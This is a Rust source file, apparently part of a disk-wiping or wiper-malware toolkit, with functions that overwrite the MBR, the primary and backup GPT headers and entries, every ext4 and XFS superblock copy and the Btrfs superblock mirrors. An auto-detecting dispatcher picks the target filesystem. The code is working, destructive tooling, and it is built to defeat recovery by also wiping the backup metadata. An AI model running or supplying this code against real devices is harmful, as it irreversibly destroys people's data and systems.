/*
 * fs_kill.rs — Partition table and filesystem structure destruction
 *
 * Targets:
 *  - GPT: primary header (LBA 1), entry array (LBA 2-33), backup entry array,
 *         backup header (last LBA)
 *  - MBR: first 512 bytes
 *  - ext4: primary + backup superblocks (sparse_super groups 1, 3^k, 5^k, 7^k)
 *  - XFS:  superblock at start of each Allocation Group
 *  - Btrfs: fixed offsets 64K / 64M / 256G / 1P
 */

use std::fs::{File, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};

use crate::Result;

const BLKGETSIZE64: libc::c_ulong = 0x80081272;

// ── Device size ───────────────────────────────────────────────────────────────

use std::os::unix::io::AsRawFd;

fn dev_size(f: &File) -> Result<u64> {
    let mut sz = 0u64;
    let r = unsafe { libc::ioctl(f.as_raw_fd(), BLKGETSIZE64, &mut sz as *mut u64) };
    if r < 0 {
        return Err(format!("BLKGETSIZE64: errno={}", unsafe { *libc::__errno_location() }));
    }
    Ok(sz)
}

// ── Zero N bytes at a given byte offset ──────────────────────────────────────

fn zero_at(f: &mut File, offset: u64, len: usize) -> Result<()> {
    f.seek(SeekFrom::Start(offset))
        .map_err(|e| format!("seek to {}: {}", offset, e))?;
    let zeros = vec![0u8; len];
    f.write_all(&zeros)
        .map_err(|e| format!("write zeros at {}: {}", offset, e))?;
    Ok(())
}

// ── GPT ───────────────────────────────────────────────────────────────────────

const GPT_SIGNATURE: &[u8; 8] = b"EFI PART";
const LBA_SIZE: u64 = 512;

pub fn fs_kill_gpt(dev: &str) -> Result<()> {
    let mut f = OpenOptions::new().read(true).write(true).open(dev)
        .map_err(|e| format!("open {}: {}", dev, e))?;

    let total_size = dev_size(&f)?;
    let total_lbas = total_size / LBA_SIZE;

    // Read primary GPT header (LBA 1)
    let mut header_buf = [0u8; 512];
    f.seek(SeekFrom::Start(LBA_SIZE)).map_err(|e| e.to_string())?;
    f.read_exact(&mut header_buf).map_err(|e| e.to_string())?;

    if &header_buf[..8] == GPT_SIGNATURE {
        // Parse alternate_lba (bytes 32–39, little-endian)
        let alt_lba = u64::from_le_bytes(header_buf[32..40].try_into().unwrap());

        // Zero primary partition entries (LBA 2, 128 entries × 128 bytes = 16 KiB)
        zero_at(&mut f, 2 * LBA_SIZE, 128 * 128)?;
        // Zero primary header
        zero_at(&mut f, 1 * LBA_SIZE, 512)?;

        if alt_lba > 0 && alt_lba < total_lbas {
            // Backup entries start 32 LBAs before backup header
            let backup_entries_lba = alt_lba.saturating_sub(32);
            zero_at(&mut f, backup_entries_lba * LBA_SIZE, 128 * 128)?;
            // Zero backup header
            zero_at(&mut f, alt_lba * LBA_SIZE, 512)?;
        }
        eprintln!("[+] GPT destroyed (primary + backup)");
    } else {
        eprintln!("[*] No GPT signature found, zeroing estimated locations");
        zero_at(&mut f, 1 * LBA_SIZE, 512)?;
        if total_lbas > 34 {
            zero_at(&mut f, (total_lbas - 1) * LBA_SIZE, 512)?;
        }
    }

    f.flush().map_err(|e| e.to_string())?;
    Ok(())
}

pub fn fs_kill_mbr(dev: &str) -> Result<()> {
    let mut f = OpenOptions::new().write(true).open(dev)
        .map_err(|e| format!("open {}: {}", dev, e))?;
    zero_at(&mut f, 0, 512)?;
    f.flush().map_err(|e| e.to_string())?;
    eprintln!("[+] MBR zeroed");
    Ok(())
}

pub fn fs_kill_partition_table(dev: &str) -> Result<()> {
    fs_kill_gpt(dev)?;
    fs_kill_mbr(dev)?;
    Ok(())
}

// ── ext4 ──────────────────────────────────────────────────────────────────────

fn ext4_has_backup_sb(group: u64) -> bool {
    if group == 0 || group == 1 { return true; }
    for base in [3u64, 5, 7] {
        let mut p = base;
        while p < group { p *= base; }
        if p == group { return true; }
    }
    false
}

pub fn fs_kill_ext4(dev: &str) -> Result<()> {
    let mut f = OpenOptions::new().read(true).write(true).open(dev)
        .map_err(|e| format!("open {}: {}", dev, e))?;

    // Primary superblock at offset 1024
    let mut sb = [0u8; 1024];
    f.seek(SeekFrom::Start(1024)).map_err(|e| e.to_string())?;
    f.read_exact(&mut sb).map_err(|e| e.to_string())?;

    let magic = u16::from_le_bytes([sb[56], sb[57]]);
    if magic != 0xEF53 {
        return Err(format!("{}: ext4 magic not found (got 0x{:04x})", dev, magic));
    }

    let log_block_size = u32::from_le_bytes(sb[24..28].try_into().unwrap());
    let block_size: u64 = 1024u64 << log_block_size;
    let blocks_per_group = u32::from_le_bytes(sb[32..36].try_into().unwrap()) as u64;
    let total_blocks = u32::from_le_bytes(sb[4..8].try_into().unwrap()) as u64;
    let num_groups = total_blocks.div_ceil(blocks_per_group);

    eprintln!("[*] ext4: block_size={} blocks_per_group={} groups={}",
        block_size, blocks_per_group, num_groups);

    for g in 0..num_groups {
        if !ext4_has_backup_sb(g) { continue; }

        // Group 0: superblock at 1024; for block_size==1024 it's at block 1 + 1024
        let sb_offset = if g == 0 {
            1024u64
        } else if block_size == 1024 {
            g * blocks_per_group * block_size + 1024
        } else {
            g * blocks_per_group * block_size
        };

        zero_at(&mut f, sb_offset, 1024)?;
    }

    f.flush().map_err(|e| e.to_string())?;
    eprintln!("[+] ext4: {} superblock(s) zeroed", num_groups);
    Ok(())
}

// ── XFS ───────────────────────────────────────────────────────────────────────

pub fn fs_kill_xfs(dev: &str) -> Result<()> {
    let mut f = OpenOptions::new().read(true).write(true).open(dev)
        .map_err(|e| format!("open {}: {}", dev, e))?;

    let mut sb = [0u8; 512];
    f.seek(SeekFrom::Start(0)).map_err(|e| e.to_string())?;
    f.read_exact(&mut sb).map_err(|e| e.to_string())?;

    if &sb[..4] != b"XFSB" {
        return Err(format!("{}: XFS magic not found", dev));
    }

    // XFS superblock fields (big-endian)
    let block_size  = u32::from_be_bytes(sb[4..8].try_into().unwrap()) as u64;
    let total_blocks= u64::from_be_bytes(sb[8..16].try_into().unwrap());
    let agblocks    = u32::from_be_bytes(sb[84..88].try_into().unwrap()) as u64;
    let agcount     = u32::from_be_bytes(sb[88..92].try_into().unwrap()) as u64;

    eprintln!("[*] XFS: block_size={} agblocks={} agcount={}",
        block_size, agblocks, agcount);

    for ag in 0..agcount {
        let offset = ag * agblocks * block_size;
        if offset >= total_blocks * block_size { break; }
        zero_at(&mut f, offset, 512)?;
    }

    f.flush().map_err(|e| e.to_string())?;
    eprintln!("[+] XFS: {} AG superblock(s) zeroed", agcount);
    Ok(())
}

// ── Btrfs ─────────────────────────────────────────────────────────────────────

const BTRFS_MAGIC: &[u8; 8] = b"_BHRfS_M";
const BTRFS_SB_OFFSETS: [u64; 4] = [
    0x0001_0000,           // 64 KiB
    0x0400_0000,           // 64 MiB
    0x4000_0000_00,        // 256 GiB
    0x0004_0000_0000_0000, // 1 PiB
];

pub fn fs_kill_btrfs(dev: &str) -> Result<()> {
    let mut f = OpenOptions::new().read(true).write(true).open(dev)
        .map_err(|e| format!("open {}: {}", dev, e))?;

    let size = dev_size(&f)?;
    let mut wiped = 0;

    for &off in &BTRFS_SB_OFFSETS {
        if off + 4096 > size { continue; }

        let mut probe = [0u8; 72]; // magic is at +64 in the superblock
        if f.seek(SeekFrom::Start(off)).is_err() { continue; }
        if f.read_exact(&mut probe).is_err() { continue; }

        if &probe[64..72] == BTRFS_MAGIC {
            zero_at(&mut f, off, 4096)?;
            wiped += 1;
        }
    }

    if wiped == 0 {
        return Err(format!("{}: Btrfs magic not found at any mirror offset", dev));
    }

    f.flush().map_err(|e| e.to_string())?;
    eprintln!("[+] Btrfs: {} superblock mirror(s) zeroed", wiped);
    Ok(())
}

// ── Auto-detect and dispatch ───────────────────────────────────────────────────

#[derive(Debug, PartialEq)]
enum FsType { Ext4, Xfs, Btrfs, Unknown }

fn detect_fs(dev: &str) -> FsType {
    let mut f = match OpenOptions::new().read(true).open(dev) {
        Ok(f) => f,
        Err(_) => return FsType::Unknown,
    };

    let probe = [0u8; 65536 + 72];

    // ext4: magic 0xEF53 at offset 1024+56
    if f.seek(SeekFrom::Start(1024)).is_ok() {
        let mut sb = [0u8; 2];
        if f.seek(SeekFrom::Start(1024 + 56)).is_ok() && f.read_exact(&mut sb).is_ok() {
            if u16::from_le_bytes(sb) == 0xEF53 { return FsType::Ext4; }
        }
    }

    // XFS: magic "XFSB" at offset 0
    if f.seek(SeekFrom::Start(0)).is_ok() {
        let mut magic = [0u8; 4];
        if f.read_exact(&mut magic).is_ok() && &magic == b"XFSB" { return FsType::Xfs; }
    }

    // Btrfs: magic at 64KiB+64
    if f.seek(SeekFrom::Start(0x10000 + 64)).is_ok() {
        let mut magic = [0u8; 8];
        if f.read_exact(&mut magic).is_ok() && &magic == BTRFS_MAGIC { return FsType::Btrfs; }
    }

    let _ = probe; // suppress unused warning
    FsType::Unknown
}

pub fn fs_kill_filesystem(dev: &str) -> Result<()> {
    match detect_fs(dev) {
        FsType::Ext4    => fs_kill_ext4(dev),
        FsType::Xfs     => fs_kill_xfs(dev),
        FsType::Btrfs   => fs_kill_btrfs(dev),
        FsType::Unknown => Err(format!("{}: filesystem not recognized (ext4/XFS/Btrfs)", dev)),
    }
}
